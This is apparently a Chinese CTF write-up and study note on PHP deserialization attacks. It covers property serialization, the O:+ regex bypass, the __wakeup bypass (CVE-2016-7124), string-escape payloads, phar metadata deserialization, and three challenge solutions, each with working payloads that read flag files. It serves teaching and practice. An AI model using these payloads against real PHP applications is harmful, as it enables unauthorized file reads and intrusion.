私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。 protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。 public 表示全局，类内部外部子类都可以访问；private 表示私有的，只有本类内部可以使用；protected 表示受保护的，只有本类或子类或父类中可以访问； &lt;?php class test&#123; public $test1 = \"hello\" private $test2 = \"hello\"; protected $test3 = \"hello\"; &#125; $test = new test(); echo serialize($test); ?> test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同 private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11 protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8 %00是不可见字符 对test.php继续进行修改 将public改为private &lt;?php class A&#123; private $file = __FILE__; function __construct($file)&#123; $this->file = $file; &#125; function __wakeup()&#123; if($this->file !== __FILE__)&#123; $this->file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this->file); &#125; &#125; if(isset($_REQUEST['file']))&#123; $file = $_REQUEST['file']; if(preg_match('/[OC]:\\d+:/i', $file))&#123; die(\"hacking!!!\"); &#125; @unserialize($_REQUEST['file']); &#125; else&#123; highlight_file(__FILE__); &#125; ?> 序列化带private属性的file &#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 将file改为%00A%00file，对应的长度改为7 即： {s:7:”%00A%00file”;s:8:”flag.php”;} exp http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 字符串逃逸在网站根目录下有两个文件，test.php和flag.php test.php源码如下： &lt;?php error_reporting(255); class A&#123; public $filename = __FILE__; public function __destruct()&#123; highlight_file($this->filename); &#125; &#125; function waf($s)&#123; return preg_replace('/flag/i', 'index', $s); &#125; if(isset($_REQUEST['x']) &amp;&amp; is_string($_REQUEST['x']))&#123; $a = [ 0 => $_REQUEST['x'], 1 => \"1\" ]; @unserialize(waf(serialize($a))); &#125;else&#123; new A(); &#125; ?> 构造payload： 首先要有个&quot;;使前面的字符串闭合 接下来是常规的序列化后的数组元素 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 但在waf()函数中，对序列化后的$a进行替换，所以将s改为S，将flag.php改为十六进制的\\66\\6C\\61\\67\\2E\\70\\68\\70，即 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125; 最后再加上&#125;使前面数组a的&#123;闭合 所以合起来是 &quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; &lt;?php $a = [ 0 => '\";i:0;O:1:\"A\":1:&#123;s:8:\"filename\";S:8:\"\\66\\6C\\61\\67\\2E\\70\\68\\70\";&#125;&#125;', 1 => '1' ]; print_r(serialize($a)); ?> 输出 a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; 所以该段字符串有65个字符 利用waf()函数将flag替换为index会增加一个字符，构造65个flag python -c print('flag'*65) 将输出结果和前面的字符串拼接在一起，得到payload flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 附： 验证payload是否正确 &lt;?php function waf($a)&#123; return preg_replace('/flag/', 'index', $a); &#125; $a = [ 0 => 'flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag\";i:0;O:1:\"A\":1:&#123;s:8:\"filename\";S:8:\"\\66\\6C\\61\\67\\2E\\70\\68\\70\";&#125;&#125;', 1 => '1' ]; print_r(waf(serialize($a))); echo \"&lt;br>\"; print_r(unserialize(waf(serialize($a)))); ?> 输出结果： a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; Array ( [0] &#x3D;&gt; __PHP_Incomplete_Class Object ( [__PHP_Incomplete_Class_Name] &#x3D;&gt; A [filename] &#x3D;&gt; flag.php ) ) python -c \"print(len('indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex'))\" 输出：325 phar反序列化(不太懂phar反序列化怎么用，这部分摘自https://paper.seebug.org/680/) phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 &lt;?php class TestObject &#123; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar->startBuffering(); $phar->setStub(\"&lt;?php __HALT_COMPILER(); ?>\"); //设置stub $o = new TestObject(); $phar->setMetadata($o); //将自定义的meta-data存入manifest $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar->stopBuffering(); ?> 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： phar_test1.php &lt;?php class TestObject &#123; public function __destruct() &#123; echo 'Destruct called'; &#125; &#125; $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?> 其他函数当然也是可行的： phar_test2.php &lt;?php class TestObject &#123; public function __destruct() &#123; echo 'Destruct called'; &#125; &#125; $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?> 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。 题目unserialize1&lt;?php show_source(__FILE__); class XianZhi&#123; public $name; function __destruct()&#123; echo file_get_contents($this->name); &#125; &#125; unserialize($_GET['a']); ?> 构造序列化代码 &lt;?php class XianZhi&#123; public $name = '/flag'; &#125; $a = new XianZhi(); echo serialize($a); ?> //O:7:\"XianZhi\":1:&#123;s:4:\"name\";s:5:\"/flag\";&#125; unserialize2OC绕过、wake up绕过 &lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this->file = $file; &#125; function __destruct() &#123; echo @highlight_file($this->file, true); &#125; function __wakeup() &#123; if ($this->file != 'index.php') &#123; //the secret is in the f15g_1s_here.php $this->file = 'index.php'; &#125; &#125; &#125; if (isset($_GET['var'])) &#123; $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) &#123; die('stop hacking!'); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(\"index.php\"); &#125; ?> 这里首先有两个要绕过的点 第一个点是__wakeup()，因为这里正常反序列化会写死$this-&gt;ﬁle属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过wakeup()。 第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是O:4，直接使用+号当做空格即可绕过，即O:+4即可绕过。 构造序列化代码 &lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this->file = $file; &#125; &#125; $a = new Demo('f15g_1s_here.php'); $a = serialize($a).\"\\n\"; $a = str_replace('O:4','O:+4',$a); $a = str_replace(':1:',':2:',$a); echo base64_encode($a); ?> //TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo= unserialize3私有属性绕过 &lt;?php highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this->process(); &#125; public function process() &#123; if($this->op == \"1\") &#123; $this->write(); &#125; else if($this->op == \"2\") &#123; $res = $this->read(); $this->output($res); &#125; else &#123; $this->output(\"Bad Hacker!\"); &#125; &#125; private function write() &#123; if(isset($this->filename) &amp;&amp; isset($this->content)) &#123; if(strlen((string)$this->content) > 100) &#123; $this->output(\"Too long!\"); die(); &#125; $res = file_put_contents($this->filename, $this->content); if($res) $this->output(\"Successful!\"); else $this->output(\"Failed!\"); &#125; else &#123; $this->output(\"Failed!\"); &#125; &#125; private function read() &#123; $res = \"\"; if(isset($this->filename)) &#123; $res = file_get_contents($this->filename); &#125; return $res; &#125; private function output($s) &#123; echo \"[Result]: &lt;br>\"; echo $s; &#125; function __destruct() &#123; if($this->op === \"2\") $this->op = \"1\"; $this->content = \"\"; $this->process(); &#125; &#125; function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) >= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; &#125; if(isset($_GET&#123;'str'&#125;)) &#123; $str = (string)$_GET['str']; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; &#125; ord() 函数返回字符串的首个字符的 ASCII 值。 file_get_contents() 把整个文件读入一个字符串中。 要利用read()的file_get_contents()读取flag.php，即/flag 所以process()的$op==”2”，然后通过output()输出 &lt;?php class FileHandler &#123; protected $op = 2; protected $filename = \"/flag\"; protected $content = \"Hello World!\"; &#125; $a = new FileHandler; $b = serialize($a); echo $b; ?> 把输出的$b适当修改，得到payload &#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\\00*\\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"},{"name":"Notes","slug":"Notes","permalink":"https://flag2020.top/categories/Notes/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"},{"name":"Linux","slug":"Linux","permalink":"https://flag2020.top/tags/Linux/"},{"name":"crypto","slug":"crypto","permalink":"https://flag2020.top/tags/crypto/"},{"name":"misc","slug":"misc","permalink":"https://flag2020.top/tags/misc/"},{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"},{"name":"搭建博客","slug":"搭建博客","permalink":"https://flag2020.top/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"},{"name":"ACM","slug":"ACM","permalink":"https://flag2020.top/tags/ACM/"}]}